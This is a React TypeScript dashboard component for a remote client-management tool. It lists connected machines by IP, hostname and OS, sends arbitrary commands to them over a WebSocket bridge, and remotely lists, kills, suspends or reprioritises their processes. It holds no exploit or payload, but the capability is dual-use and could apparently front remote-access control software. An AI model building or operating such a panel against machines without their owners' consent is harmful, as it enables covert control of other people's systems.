import { useEffect, useMemo, useState } from 'react'
import CommandPanel from '../../UI/CommandPanel'
import ClientList, { type ClientItem } from '../../UI/ClientList'
import { ConfirmModal } from '../../UI'
import { useBridgeWebSocket } from '../../hooks/BridgeWebSocketProvider'
import { useConfirmAction } from '../../hooks/useConfirmAction'
import ProcessManager from '../../UI/ProcessManager'
import { useDashboardStore } from '../../store/dashboardStore.ts'
import { useToast } from '../../UI/Toast'

interface CommandOutputPayload {
  clientId?: string
  output?: string
  result?: string
  data?: string
}

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === 'object' && value !== null
}

function mapCachedClientToItem(value: unknown): ClientItem | null {
  if (!isRecord(value)) return null

  const id = String(value.id ?? '').trim()
  if (!id) return null

  return {
    id,
    ip: String(value.ip ?? value.ip_address ?? '-'),
    hostname: String(value.hostname ?? value.host ?? '-'),
    os: String(value.os ?? value.os_version ?? value.platform ?? '-'),
    status: String(value.status ?? (value.is_online ? 'online' : 'offline')),
    lastSeen: typeof value.lastSeen === 'number' ? value.lastSeen : typeof value.last_seen === 'number' ? value.last_seen : Date.now(),
  }
}

function extractOutput(payload: unknown): CommandOutputPayload {
  if (typeof payload === 'string') {
    return { output: payload }
  }

  if (!isRecord(payload)) {
    return {}
  }

  return {
    clientId: typeof payload.clientId === 'string' ? payload.clientId : undefined,
    output:
      typeof payload.output === 'string'
        ? payload.output
        : typeof payload.result === 'string'
          ? payload.result
          : typeof payload.data === 'string'
            ? payload.data
            : undefined,
  }
}

const PRIORITY_LABELS: Record<number, string> = {
  64: 'IDLE',
  32: 'NORMAL',
  128: 'HIGH',
  256: 'REALTIME'
};

function parseProcessResult(output: string): { action: string; success: boolean; pid: number; message: string } | null {
  // Format: PROCESS_RESULT|action|success/fail|pid|message
  // Must be at start of line (after possible newline)
  // Stop at newline OR at PROCESS_LIST_RESPONSE (in case they're concatenated)
  const match = output.match(/(?:^|\n)PROCESS_RESULT\|(\w+)\|(\w+)\|(\d+)\|([^\n]+?)(?:\n|PROCESS_LIST_RESPONSE|$)/);
  if (!match) return null;
  // Clean the message: strip any trailing garbage like PROCESS_LIST_RESPONSE or raw JSON
  let message = match[4].trim();
  // Remove anything after PROCESS_LIST_RESPONSE if it leaked in
  const listRespIdx = message.indexOf('PROCESS_LIST_RESPONSE');
  if (listRespIdx !== -1) message = message.substring(0, listRespIdx).trim();
  // Remove anything that looks like JSON (starts with [ or {)
  const jsonStart = message.search(/[\[{]/);
  if (jsonStart !== -1) message = message.substring(0, jsonStart).trim();
  return {
    action: match[1],
    success: match[2] === 'success',
    pid: parseInt(match[3]),
    message
  };
}

export default function Dashboard() {
  const [selectedClientId, setSelectedClientId] = useState<string | undefined>(undefined)
  const [tab, setTab] = useState<'commands' | 'processes'>('commands')

  const { status, lastError, sendToTopic, subscribeAll } = useBridgeWebSocket()
  const dashboardStore = useDashboardStore()
  const toast = useToast();

  const clients = useMemo(() => {
    return dashboardStore.clients.map(mapCachedClientToItem).filter((client): client is ClientItem => client !== null)
  }, [dashboardStore.clients])
  
  // Get output and processes from store
  const output = useMemo(() => {
    return selectedClientId ? dashboardStore.getCommandOutput(selectedClientId) : ''
  }, [selectedClientId, dashboardStore])
  
  const processes = useMemo(() => {
    if (!selectedClientId) return []
    const cached = dashboardStore.getProcessList(selectedClientId)
    return cached || []
  }, [selectedClientId, dashboardStore])

  const selectedClient = useMemo(() => {
    return clients.find((client) => client.id === selectedClientId)
  }, [clients, selectedClientId])

  useEffect(() => {
    const unsubscribe = subscribeAll((message, topic) => {
      const resolvedTopic = topic ?? message.topic ?? message.type

      if (resolvedTopic === 'command_output' || resolvedTopic === 'client_output') {
        const commandOutput = extractOutput(message.payload ?? message.output ?? message.data)
        const clientId = commandOutput.clientId || selectedClientId
        
        if (clientId && commandOutput.output) {
          dashboardStore.addCommandOutput(clientId, commandOutput.output)
          
          // Parse PROCESS_RESULT for success/failure toasts
          const result = parseProcessResult(commandOutput.output);
          if (result) {
            const actionLabels: Record<string, string> = {
              kill: 'Kill',
              suspend: 'Suspend',
              resume: 'Resume',
              priority: 'Priority'
            };
            const actionLabel = actionLabels[result.action] || result.action;
            
            if (result.success) {
              let detail = result.message;
              // For priority, show the label instead of raw number
              if (result.action === 'priority') {
                const prioLabel = PRIORITY_LABELS[parseInt(result.message)] || result.message;
                detail = `Set to ${prioLabel}`;
              }
              toast.success(`${actionLabel} succeeded`, `PID ${result.pid}: ${detail}`, 4000);
            } else {
              toast.error(`${actionLabel} failed`, `PID ${result.pid}: ${result.message}`, 5000);
            }
            
          }
        }
        return
      }

      if (resolvedTopic === 'process_list') {
        const processClientId = typeof message.clientId === 'string' ? message.clientId : selectedClientId
        const rawProcesses = (Array.isArray(message.processes)
          ? message.processes
          : Array.isArray(message.payload)
            ? message.payload
            : Array.isArray(message.data)
              ? message.data
              : []) as any[]
        const parsed = Array.isArray(rawProcesses) ? rawProcesses.map((p: any) => ({
          pid: p.pid as number,
          name: p.name as string || '',
          memory: p.memory as number || 0,
          architecture: p.architecture as string || 'Unknown',
          username: p.username as string || 'Unknown',
          path: p.path as string || '',
          priority: p.priority as number || 0
        })) : []
        
        if (processClientId && parsed.length > 0) {
          dashboardStore.setProcessList(processClientId, parsed)
        }
        return
      }

    })

    return unsubscribe
  }, [selectedClientId, subscribeAll, dashboardStore, toast])

  useEffect(() => {
    setSelectedClientId((current) => {
      if (clients.length === 0) return undefined
      if (current && clients.some((client) => client.id === current)) return current
      return clients[0].id
    })
  }, [clients])

  const handleSendCommand = (command: string) => {
    if (!selectedClientId) {
      dashboardStore.addCommandOutput('system', '[system] Select a client before sending a command.')
      return
    }

    const sent = sendToTopic('command', {
      clientId: selectedClientId,
      command,
    })

    if (!sent) {
      dashboardStore.addCommandOutput(selectedClientId, '[system] Failed to send command (socket not connected).')
      return
    }

    dashboardStore.addCommandOutput(selectedClientId, `> ${command}`)
  }

  const deleteClientRequest = (client: ClientItem) => {
    dashboardStore.removeClient(client.id)
    sendToTopic('db_query', {
      query: 'delete_client',
      clientId: client.id,
      impersonateUserId: dashboardStore.impersonateUserId ?? undefined,
    })
  }

  const {
    pendingItem: pendingDeleteClient,
    isOpen: isDeleteModalOpen,
    requestConfirm: requestDeleteConfirm,
    cancelConfirm: cancelDeleteConfirm,
    confirm: confirmDeleteClient,
  } = useConfirmAction<ClientItem>(deleteClientRequest)

  const loadProcesses = () => {
    if (!selectedClientId) return
    
    // Check if we need to refresh the process list
    if (dashboardStore.shouldRefreshProcessList(selectedClientId)) {
      // Send PROCESS_LIST command instead of get_processes topic
      handleSendCommand('PROCESS_LIST')
    } else {
      // Use cached data, no need to send command
      dashboardStore.addCommandOutput(selectedClientId, '[system] Using cached process list (refreshed within last 30 seconds)')
    }
  }

  return (
    <div className="space-y-4">
      <div className="panel flex flex-wrap items-center justify-between gap-3 px-4 py-1 w-full">
        <div>
          <h3 className="text-lg font-semibold text-slate-100">Client Command Dashboard</h3>
          {selectedClient ? (
            <p className="text-sm text-slate-300">
              Selected: <span className="font-medium text-slate-100">{selectedClient.id}</span> · {selectedClient.hostname} ·{' '}
              {selectedClient.ip} · {selectedClient.os}
            </p>
          ) : (
            <p className="text-sm text-slate-400">No client selected</p>
          )}
        </div>

        <div className="text-right text-sm">
          <p className="text-slate-300">Socket: <span className="font-medium capitalize text-slate-100">{status}</span></p>
          {lastError ? <p className="text-red-400">{lastError}</p> : null}
        </div>
      </div>

      <div className="grid gap-4 flex-col w-full">
        <ClientList
          clients={clients}
          onSelectClient={(client) => setSelectedClientId(client.id)}
          selectedClientId={selectedClientId}
          onDeleteClient={requestDeleteConfirm}
        />
        <div className="grid min-w-0 gap-4 flex-col w-full overflow-hidden">
          <div className="flex border-b border-slate-800">
            <button
              className={`px-4 py-2 font-medium ${tab === 'commands' ? 'border-b-2 border-brand-500 text-brand-400' : 'text-slate-400 hover:text-slate-200'}`}
              onClick={() => setTab('commands')}
            >
              Commands
            </button>
            <button
              className={`px-4 py-2 font-medium ${tab === 'processes' ? 'border-b-2 border-brand-500 text-brand-400' : 'text-slate-400 hover:text-slate-200'}`}
              onClick={() => setTab('processes')}
            >
              Processes
              <span className="ml-1 text-xs bg-slate-800 px-2 py-1 rounded-full">{processes.length}</span>
            </button>
          </div>
          {tab === 'commands' ? (
            <CommandPanel onSendCommand={handleSendCommand} output={output} />
          ) : (
            <div className="flex flex-col w-full h-fit gap-2">
              <div className="flex h-12 items-center justify-between p-4 mr-15 border-b">
                <h3 className="text-lg font-semibold">Processes ({processes.length})</h3>
                <button
                  onClick={loadProcesses}
                  className="px-3 py-1 bg-brand-600 text-white rounded-lg hover:bg-brand-500 transition"
                >
                  Refresh
                </button>
              </div>
              <ProcessManager
                clientId={selectedClientId}
                onSendCommand={handleSendCommand}
                processes={processes}
              />
            </div>
          )}
        </div>
      </div>

      <ConfirmModal
        open={isDeleteModalOpen}
        title="Delete Client"
        message={pendingDeleteClient ? `Delete client ${pendingDeleteClient.id}? This removes stored data and disconnects it if online.` : ''}
        confirmLabel="Delete"
        cancelLabel="Cancel"
        variant="danger"
        onConfirm={confirmDeleteClient}
        onCancel={cancelDeleteConfirm}
      />
    </div>
  )
}